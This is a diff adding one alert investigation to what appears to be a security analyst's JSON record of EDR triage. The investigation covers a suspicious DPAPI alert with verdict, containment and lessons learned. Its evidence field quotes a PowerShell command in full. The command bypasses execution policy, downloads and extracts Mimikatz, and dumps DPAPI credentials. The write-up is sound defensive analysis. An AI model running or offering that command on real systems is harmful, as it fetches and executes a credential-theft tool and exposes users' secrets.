@@ -12,6 +12,39 @@
       "email": ""
     }
   },
-  "alerts": [],
+  "alerts": [
+    {
+      "id": "ALT-001",
+      "alertName": "Suspicious DPAPI Activity",
+      "alertId": "dae9ebb86f-3d3d-4d7a-a179-f7bdadd2d2ee_1",
+      "date": "2026-05-28",
+      "severity": "High",
+      "hostOrAccount": "EC2AMAZ-90H9AQQ / NT AUTHORITY\\SYSTEM",
+      "dateTime": "28 May 2026 11:16:15 AM UTC",
+      "whatTriggered": "The alert was triggered by a behaviour-based detection (detection technology) of a suspicious application attempting to use the Data Protection API (DPAPI) to decrypt sensitive information or encrypt content for evasion.",
+      "whyTriggered": "The alert triggered via Behavioural Analysis (detection technology), which identified powershell.exe [PID: 5808] (under Entity Name - it was the active process carrying out the suspicious behaviour) attempting to access the Data Protection API (DPAPI) for credential decryption - a technique associated with credential theft tools like Mimikatz (link under Entity Name to the Mimikatz Github repository and the version number provide the source of that activity).",
+      "whatHappened": "An automated detection event identified wusvc.exe (under Process Tree, which is under Alert story -> What happened) initiating a PowerShell process (which can be seen in the Process Tree, under wusvc.exe) (powershell.exe, PID: 5808). This process successfully executed commands designed to leverage the Data Protection API (DPAPI) to decrypt sensitive local credentials. While the EDR granted the 'Suspicious DPAPI Activity' alert based on this behaviour, the Process Tree confirms that the malicious command script was fully parsed and executed on the host, consistent with Mimikatz-based credential theft.",
+      "evidence": "// Process Tree\n[5888] nssm.exe\n └─ [7012] wusvc.exe -server http://172.31.2.203:8888 -group red\n      └─ powershell.exe -ExecutionPolicy Bypass -C \"$p = \\\"$env:TEMP\\svcdiag3\\\"; New-Item -ItemType Directory -Path $p -Force | Out-Null; $zip = \\\"$p\\kb97416.zip\\\"; (New-Object System.Net.WebClient).DownloadFile(  'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip',  $zip); Expand-Archive -Path $zip -DestinationPath $p -Force; $mimi = \\\"$p\\x64\\mimikatz.exe\\\"; if (Test-Path $mimi) {  & $mimi privilege::debug dpapi::cred /unprotect dpapi::cache exit 2>&1} else {  Write-Output \\\"Binary not found at expected path\\\"}\"",
+      "wasSuccessful": "Yes",
+      "verdict": "Malicious",
+      "verdictJustification": "The automated behavioural analysis identified an unauthorised process (wusvc.exe) launching powershell.exe to perform DPAPI decryption. Furthermore, the system successfully correlated this activity with known indicators of the Mimikatz credential theft framework, confirming adversarial intent. While the security controls successfully detected the activity, telemetry confirms that the malicious command was executed on the endpoint. This successful execution allowed the attacker to reach the credential harvesting stage, necessitating an urgent response to contain the threat and mitigate potential credential exposure.",
+      "investigationSteps": [
+        "I analysed the primary alert details, specifically the Detection source (EDR) and Detection technology (Behaviour) to understand how the system identified the activity.",
+        "I examined the Evidence section and the Process Tree, which revealed the full attack chain (nssm.exe -> wusvc.exe -> powershell.exe). This confirmed the persistence mechanism and the specific process responsible for the malicious activity.",
+        "I verified the execution status via the alert telemetry, which confirmed that the command successfully executed on the host. I then cross-referenced the activity with the MITRE ATT&CK category of Credential Access and the Mimikatz repository, confirming adversarial intent and the successful deployment of a credential theft tool."
+      ],
+      "queries": "No custom KQL queries were required, as the built-in alert evidence provided sufficient data for verification.",
+      "categorisation": "TP",
+      "escalation": "Urgent",
+      "containment": "Immediately isolate the affected host (EC2AMAZ-90H9AQQ) from the network to prevent potential lateral movement or further command-and-control communication. Perform a full scan of the host using the EDR to identify any additional malicious artifacts or persistence mechanisms. Review all user accounts associated with this host for suspicious activity and trigger a mandatory password reset if any credential exposure is suspected. ",
+      "alertTuning": "Tune recommended",
+      "lessonsLearned": "I learned that while alerts can be overwhelming, the key to an efficient investigation is relying on the Process Tree and Detection Technology rather than manually hunting through excessive logs when the built-in evidence is sufficient. Moving forward, I will prioritise mapping suspicious behaviours to the MITRE ATT&CK framework immediately upon opening an alert to expedite my understanding of adversarial intent. Furthermore, I have learned the critical distinction between 'Detection' and 'Prevention'; I will no longer assume that an alert status of 'Detected' implies a successfully blocked threat, and I will verify the execution status of all high-severity processes to accurately assess organizational risk.",
+      "tools": [
+        "Microsoft Defender for Endpoint",
+        "MITRE ATT&CK"
+      ],
+      "verified": true
+    }
+  ],
   "bec": []
 }
